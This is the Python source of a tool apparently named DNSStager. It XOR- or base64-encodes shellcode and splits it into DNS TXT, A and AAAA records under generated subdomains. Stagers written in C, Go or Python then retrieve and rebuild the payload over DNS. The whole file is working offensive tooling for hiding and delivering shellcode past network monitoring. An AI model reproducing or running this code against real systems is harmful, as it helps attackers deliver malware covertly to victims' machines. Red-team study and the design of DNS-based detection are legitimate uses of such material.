#!/usr/bin/python3


import os
import sys
import time
from termcolor import cprint
from validators import domain
from base64 import *
from .dnsserver import *

dnsstager_payloads = {

    "x64/c/ipv6": "Resolve your payload as IPV6 addresses xored with custom key via compiled x64 C code",
    "x64/c/ipv4": "Resolve your payload as IPV4 addresses xored with custom key via compiled x64 C code",
    "x86/c/ipv6": "Resolve your payload as IPV6 addresses xored with custom key via compiled x86 C code",
    "x86/c/ipv4": "Resolve your payload as IPV4 addresses xored with custom key via compiled x86 C code",
    "x64/golang/txt": "Resolve your payload as TXT records encoded using base64 compiled x64 GoLang code",
    "x64/golang/ipv6": "Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x64 GoLang code",
    "x64/golang/ipv4":  "Resolve your payload as IPV4 addresses encoded with custom key using byte add encoding via compiled x64 GoLang code",
    "x86/golang/txt": "Resolve your payload as TXT records encoded using base64 compiled x86 GoLang code",
    "x86/golang/ipv6": "Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x86 GoLang code",
    "x86/golang/ipv4":  "Resolve your payload as IPV4 addresses encoded with custom key using byte add encoding via compiled x86 GoLang code",
    "python/xor/ipv6": "Resolve your payload as IPV6 addresses xored with custom key via python script",
    "python/xor/ipv4": "Resolve your payload as IPV4 addresses xored with custom key via python script",
    "python/b64/txt":  "Resolve your payload as TXT records encoded using base64 via python script",

    }


def print_error(message):
    cprint("[-] %s" % message, "red")

def print_success(message):
    cprint("[-] %s" % message, "green")

def print_info(message):
    cprint("[!] %s" % message, "yellow")

# This function will read the shellcode as byte array from a file
def read_shellcode(bin_path):
    if os.path.isfile(bin_path):
        f = open(bin_path, "rb")
        shellcode_data = f.read()
        return shellcode_data
    else:
        print_error("Shellcode file is not exist!")
        exit()


def check_domain_name(domain_name):
    return domain(domain_name)

def banner():
    version = '\33[43m V1.0 Beta \033[0m'
    Yellow = '\33[33m'
    OKGREEN = '\033[92m'
    CRED = '\033[91m'
    ENDC = '\033[0m'
    Cyan = "\033[36m"
    banner = r'''
    {0}
  ____  _   _ ____ ____  _
 |  _ \| \ | / ___/ ___|| |_ __ _  __ _  ___ _ __
 | | | |  \| \___ \___ \| __/ _` |/ _` |/ _ \ '__|
 | |_| | |\  |___) |__) | || (_| | (_| |  __/ |
 |____/|_| \_|____/____/ \__\__,_|\__, |\___|_|
                                  |___/
    {1}

    {2}Beta Version{1}                           {3}Let me be your master DNS{1}
    '''
    print(banner.format(Yellow, ENDC, OKGREEN, Cyan))


def show_payloads():
    print("\n[+] %s DNSStager payloads Available\n" % len(dnsstager_payloads))
    for payload in dnsstager_payloads:
        print(payload + "\t\t\t" + dnsstager_payloads[payload])
    print("\n")

def encode_shellcode_base64(shellcode):
    encoded_shellcode = b64encode(shellcode)
    return encoded_shellcode.decode()


def convert_string_key_to_int(key):
    return int(key.replace("0x", ""))


# you can't use base64 with ipv6 payloads
def encode_xor_shellcode(shellcode, key):
    new_shellcode = []
    for opcode in shellcode:
        new_opcode = opcode ^ key
        new_hex_opcode = hex(new_opcode)
        # This will fix a bug happen when we return any opcode begin with 0x0
        # For example, 0x0f will be translated to 0xf which will break the opcode sequence
        # We will check if the length of the opcode is equal to 3 and then append extra 0
        # So the final result will be 0x0f insted of 0xf
        # The 0x0 will automatically be replaced later on with 0x00
        if len(new_hex_opcode) == 3:
            new_hex_opcode = new_hex_opcode.replace("0x", "0x0")

        if new_hex_opcode == "0x0":
            new_hex_opcode = "0x00"

        new_shellcode.append(new_hex_opcode)
    encoded_shellcode = "".join(["{0}".format(i).replace("0x", "") for i in new_shellcode])
    return encoded_shellcode


def generate_zone_TXT(domain, shellcode, prefix):
    # split to TXT records each record with 200 bytes
    # can be option later on ;)
    splitter = 200
    txt_records =  [shellcode[i:i+splitter] for i in range(0, len(shellcode), splitter)]
    print(txt_records)

    # Empty ZONES
    ZONES = {}
    # generate random domains
    for i in range(len(txt_records)):
        domain_name = prefix + str(i) + "." + domain
        ZONES[domain_name] = [Record(TXT, txt_records[i])]
    print(ZONES)
    return(ZONES)


def generate_zone_ipv4(domain, shellcode, prefix):
    # convert each opcode to decimal
    splitter = 4
    # generate list of 4 elements for each ip
    # each list represent on A record
    opcodes =  [str(ord(i)) for i in shellcode]
    ipv4_list_records =  [opcodes[i:i+splitter] for i in range(0, len(opcodes), splitter)]
    print(ipv4_list_records)
    # Empty ZONES for later use
    ZONES = {}

    counter = 0
    for list in ipv4_list_records:
        # generate random domains
        domain_name = prefix + str(counter) + "." + domain
        print(domain_name)
        if len(list) != 4:
            elements_to_extend = 4 - len(list)
            list.extend([str(i) for i in range(elements_to_extend)])
        ip = ".".join(i for i in list)
        ZONES[domain_name] = [Record(A, ip)]
        counter = counter + 1
    #print(ZONES)
    return(ZONES)



def generate_zone_ipv6(domain, shellcode, prefix):
    ipv6s = []
    # split into 16
    splitter = 32
    splitted_shellcode =  [shellcode[i:i+splitter] for i in range(0, len(shellcode), splitter)]
    octets_splitter = 4
    for octet_groups in splitted_shellcode:
        opcodes = [octet_groups[i:i+octets_splitter] for i in range(0, len(octet_groups), octets_splitter)]
        ipv6 = ":".join(opcodes)
        ipv6s.append(ipv6)


    # Empty ZONES
    ZONES = {}

    # generate random domains
    for i in range(len(ipv6s)):
        domain_name = prefix + str(i) + "." + domain

        #ZONES = {domain:[Record(AAAA, i) for i in ipv6s]}
        ZONES[domain_name] = [Record(AAAA, ipv6s[i])]
    #print(ZONES)
    return(ZONES)
